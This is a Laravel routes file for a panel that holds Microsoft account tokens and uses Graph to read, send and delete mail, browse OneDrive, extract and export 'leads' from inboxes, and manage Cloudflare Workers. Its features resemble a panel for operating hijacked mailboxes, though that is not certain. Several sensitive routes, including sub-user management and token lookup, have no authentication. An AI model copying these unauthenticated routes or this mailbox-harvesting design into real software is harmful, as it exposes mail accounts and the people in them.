<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\SubUserController;
use App\Http\Controllers\MicrosoftInboxController;
use App\Http\Controllers\RulesController;
use App\Services\MicrosoftGraphService;
use Illuminate\Support\Facades\Http;
use App\Http\Controllers\UserSettingController;
use App\Http\Controllers\TokenController;
use App\Http\Controllers\CloudflareWorkerController;
use App\Http\Controllers\Auth\AuthenticatedSessionController;
use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| AUTH (PUBLIC)
|--------------------------------------------------------------------------
*/

Route::get('/gsub/{tokenId}', function ($tokenId, MicrosoftGraphService $graph) {
    return $graph->createSubscription($tokenId);
});
Route::get('/debug-sub', function(){
    return 'SUB OK';
});

Route::get('/mail/stream', function () {
    return response()->stream(function () {
        while (true) {
            if (connection_aborted()) break;

            $ping = cache()->get('mail_ping', 0);

            echo "data: {$ping}\n\n";

            ob_flush();
            flush();

            sleep(2);
        }
    }, 200, [
        'Content-Type' => 'text/event-stream',
        'Cache-Control' => 'no-cache',
        'Connection' => 'keep-alive',
    ]);
});

Route::match(['GET','POST'], '/webhook/graph/mail', function (Request $request) {

    if ($request->has('validationToken')) {
        return response($request->get('validationToken'), 200)
            ->header('Content-Type', 'text/plain');
    }

    \Log::info('GRAPH WEBHOOK HIT', $request->all());

    cache()->put('mail_ping', now()->timestamp, 60);

    foreach ($request->input('value', []) as $notification) {

        $subId = $notification['subscriptionId'];

        $sub = \App\Models\GraphSubscription::where('subscription_id', $subId)->first();

        if (!$sub) {
            \Log::warning("Subscription tidak ditemukan", ['id' => $subId]);
            continue;
        }

        dispatch(function () use ($sub) {

            try {
                $graph = app(\App\Services\MicrosoftGraphService::class);
                $graph->delta($sub->token_id);

            } catch (\Throwable $e) {
                \Log::error('DELTA ERROR', [
                    'token_id' => $sub->token_id,
                    'error' => $e->getMessage()
                ]);
            }

        });
    }

    return response()->json(['ok' => true]);
});

Route::get('/mail/{messageId}/attachment/{attachmentId}/preview',
    [MicrosoftInboxController::class, 'attachmentPreview']
)->where([
    'messageId' => '[A-Za-z0-9\-_=]+',
    'attachmentId' => '[A-Za-z0-9\-_=]+'
])->name('mail.attachment.preview');

/*
|--------------------------------------------------------------------------
| AUTH GROUP
|--------------------------------------------------------------------------
*/

Route::middleware('auth')->group(function () {

    Route::get('/leads', [MicrosoftInboxController::class, 'leadsPage']);

    Route::post('/leads/start', [MicrosoftInboxController::class, 'startExtraction']);
    Route::get('/leads/status', [MicrosoftInboxController::class, 'leadsStatus']);
    Route::get('/leads/data', [MicrosoftInboxController::class, 'leadsData']);

    Route::get('/leads/refresh', [MicrosoftInboxController::class, 'refreshLeads']);
    Route::get('/leads/export/{type}', [MicrosoftInboxController::class, 'exportLeads']);
});

/*
|--------------------------------------------------------------------------
| WORKERS
|--------------------------------------------------------------------------
*/

Route::middleware('auth')->group(function () {

    Route::get('/workers', [CloudflareWorkerController::class, 'index']);
    Route::post('/workers', [CloudflareWorkerController::class, 'store']);
    Route::post('/cloudflare/save', [CloudflareWorkerController::class, 'save']);
    Route::delete('/workers/{id}', [CloudflareWorkerController::class, 'destroy'])->where('id','[0-9]+');
    Route::get('/mail/full/{id}', [MicrosoftInboxController::class, 'full'])->where('id','[A-Za-z0-9\-_=]+');
});

/*
|--------------------------------------------------------------------------
| GENERAL
|--------------------------------------------------------------------------
*/

Route::get('/workers/check-name', [CloudflareWorkerController::class, 'checkName']);

Route::get('/sub-users', [SubUserController::class, 'index']);
Route::post('/sub-users', [SubUserController::class, 'store']);
Route::post('/sub-users/{id}/tokens', [SubUserController::class, 'assignTokens'])->where('id','[0-9]+');
Route::delete('/sub-users/{id}', [SubUserController::class, 'destroy'])->where('id','[0-9]+');

Route::post('/sub-users/{id}/update-key', [SubUserController::class, 'updateKey'])->where('id','[0-9]+');

Route::get('/api/sub-user/{id}', function($id){
    $user = \App\Models\User::with('accessibleTokens')->findOrFail($id);
    return ['tokens' => $user->accessibleTokens->pluck('id')];
})->where('id','[0-9]+');

/*
|--------------------------------------------------------------------------
| AUTH
|--------------------------------------------------------------------------
*/

Route::get('/login', [AuthenticatedSessionController::class, 'create'])->name('login');
Route::post('/login', [AuthenticatedSessionController::class, 'store']);

Route::post('/logout', function () {
    Auth::logout();
    request()->session()->invalidate();
    request()->session()->regenerateToken();
    return redirect('/login');
})->name('logout');

/*
|--------------------------------------------------------------------------
| PROTECTED
|--------------------------------------------------------------------------
*/

Route::middleware('auth')->group(function () {

    Route::get('/dashboard', [UserSettingController::class, 'index'])->name('dashboard');

    Route::get('/tokens', [TokenController::class, 'index']);
    Route::delete('/tokens/{id}', [TokenController::class, 'destroy'])->where('id','[0-9]+');

    Route::get('/tokens/status', function () {
        return \App\Models\Token::select('id', 'status', 'expires_at')->get();
    });

    Route::get('/settings', [UserSettingController::class, 'settings']);
    Route::post('/settings/update', [UserSettingController::class, 'updateKey']);

    Route::get('/war', fn() => view('war'));

    Route::get('api/search', [MicrosoftInboxController::class, 'searchApi']);

    Route::get('/onedrive/folder/{id}', [MicrosoftInboxController::class,'oneDriveFolder'])->where('id','[A-Za-z0-9\-_=]+');
    Route::get('/onedrive/files',[MicrosoftInboxController::class,'oneDriveFiles']);
    Route::get('/rules/check',[MicrosoftInboxController::class,'checkRules']);

    Route::get('/token/scopes', fn(MicrosoftGraphService $graph)=>["scopes"=>$graph->scopes()]);

    Route::get('/folders',[MicrosoftInboxController::class,'folders']);
    Route::post('/folder/create',[MicrosoftInboxController::class,'createFolder']);
    Route::post('/mail/move',[MicrosoftInboxController::class,'move']);
    Route::post('/mail/archive/{id}', [MicrosoftInboxController::class,'archive'])->where('id','[A-Za-z0-9\-_=]+');

    Route::get('/mail/item/{id}', [MicrosoftInboxController::class,'mailItem'])->where('id','[A-Za-z0-9\-_=]+');
    Route::delete('/folder/delete/{id}', [MicrosoftInboxController::class,'deleteFolder'])->where('id','[A-Za-z0-9\-_=]+');
    Route::patch('/folder/rename/{id}', [MicrosoftInboxController::class,'renameFolder'])->where('id','[A-Za-z0-9\-_=]+');

    Route::get('/inbox', [MicrosoftInboxController::class,'inbox']);
    Route::get('/folder/{folder}', [MicrosoftInboxController::class,'folder'])->where('folder','[A-Za-z0-9\-_]+');

    Route::get('/mail/delta',[MicrosoftInboxController::class,'delta']);

    Route::get('/mail/attachment/{messageId}/{attachmentId}', [MicrosoftInboxController::class,'attachmentPreview'])
        ->where(['messageId'=>'[A-Za-z0-9\-_=]+','attachmentId'=>'[A-Za-z0-9\-_=]+']);

    Route::get('/rules/json', [RulesController::class, 'json']);

    Route::get('/settings/rules',[RulesController::class,'index']);
    Route::post('/settings/rules',[RulesController::class,'store']);
    Route::delete('/settings/rules/{id}',[RulesController::class,'delete'])->where('id','[0-9]+');

    Route::get('/mail/compose', [MicrosoftInboxController::class,'compose']);
    Route::post('/mail/send', [MicrosoftInboxController::class,'send']);

    Route::get('/mail/preview/{id}',[MicrosoftInboxController::class,'preview'])->where('id','[A-Za-z0-9\-_=]+');
    Route::get('/mail/thread/{conversation}',[MicrosoftInboxController::class,'conversation'])->where('conversation','[A-Za-z0-9\-_=]+');

    Route::get('/mail/{id}/attachments',[MicrosoftInboxController::class,'attachments'])->where('id','[A-Za-z0-9\-_=]+');
    Route::get('/mail/{messageId}/attachment/{attachmentId}',[MicrosoftInboxController::class,'downloadAttachment'])
        ->where(['messageId'=>'[A-Za-z0-9\-_=]+','attachmentId'=>'[A-Za-z0-9\-_=]+']);

    Route::get('/mail/delete/{id}', [MicrosoftInboxController::class, 'deleteMail'])->where('id','[A-Za-z0-9\-_=]+');
    Route::get('/mail/unread/{id}',[MicrosoftInboxController::class,'markUnread'])->where('id','[A-Za-z0-9\-_=]+');
    Route::get('/mail/flag/{id}',[MicrosoftInboxController::class,'toggleFlag'])->where('id','[A-Za-z0-9\-_=]+');

    Route::get('/mail/reply/{id}', [MicrosoftInboxController::class,'replyForm'])->where('id','[A-Za-z0-9\-_=]+');
    Route::get('/mail/reply-all/{id}', [MicrosoftInboxController::class,'replyAllForm'])->where('id','[A-Za-z0-9\-_=]+');
    Route::get('/mail/forward/{id}', [MicrosoftInboxController::class,'forwardForm'])->where('id','[A-Za-z0-9\-_=]+');
    Route::get('/mail/read/{id}', [MicrosoftInboxController::class,'markRead'])->where('id','[A-Za-z0-9\-_=]+');

    Route::get('/mail/recover/{id}', [MicrosoftInboxController::class,'recover'])->where('id','[A-Za-z0-9\-_=]+');
    Route::get('/mail/empty-trash', [MicrosoftInboxController::class,'emptyTrash']);
    Route::get('/mail/delete-permanent/{id}',[MicrosoftInboxController::class,'deletePermanent'])->where('id','[A-Za-z0-9\-_=]+');

    Route::get('/switch-account/{id}', function ($id) {

        $user = auth()->user();

        if ($user->isSubUser()) {
            $allowed = $user->accessibleTokens()->where('tokens.id', $id)->exists();
            if (!$allowed) abort(403);
        } else {
            $owned = \App\Models\Token::where('user_id', $user->id)->where('id', $id)->exists();
            if (!$owned) abort(403);
        }

        session(['active_token' => $id]);

        $graph = app(\App\Services\MicrosoftGraphService::class);

        $sub = \App\Models\GraphSubscription::where('token_id', $id)->first();

        if (!$sub || now()->addMinutes(5)->greaterThan($sub->expires_at)) {
            try {
                $graph->createSubscription($id);
                \Log::info('SWITCH AUTO SUBSCRIBE', ['token_id' => $id]);
            } catch (\Throwable $e) {
                \Log::error('SWITCH SUBSCRIBE FAILED', [
                    'token_id' => $id,
                    'error' => $e->getMessage()
                ]);
            }
        }

        return redirect('/inbox');
    })->where('id','[0-9]+');

    Route::get('/mail/{id}', [MicrosoftInboxController::class,'read'])
        ->where('id','[A-Za-z0-9\-_=]+');

});